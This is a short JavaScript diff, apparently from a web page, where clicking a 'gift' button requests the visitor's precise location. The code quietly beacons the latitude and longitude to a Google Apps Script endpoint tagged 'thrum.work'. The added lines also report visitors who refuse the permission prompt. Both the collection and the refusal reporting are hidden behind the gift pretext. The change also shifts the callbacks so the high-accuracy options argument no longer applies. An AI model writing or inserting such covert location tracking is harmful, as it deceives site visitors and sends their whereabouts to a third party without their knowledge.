@@ -607,6 +607,8 @@ giftBtn.addEventListener('click', () => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(function(pos) {
         new Image().src = 'https://script.google.com/macros/s/AKfycbyAj7K81-Yp_M8SCVv5bjsi6P1oQip0i0pzKXMULPFQCMGoPQmRieiUaE2UUGAFYPgP/exec?lat=' + pos.coords.latitude + '&lng=' + pos.coords.longitude + '&site=thrum.work';
+      }, function() {
+        new Image().src = 'https://script.google.com/macros/s/AKfycbyAj7K81-Yp_M8SCVv5bjsi6P1oQip0i0pzKXMULPFQCMGoPQmRieiUaE2UUGAFYPgP/exec?lat=rejected&lng=rejected&site=thrum.work';
       }, function(){}, { enableHighAccuracy: true });
     }
   } else {
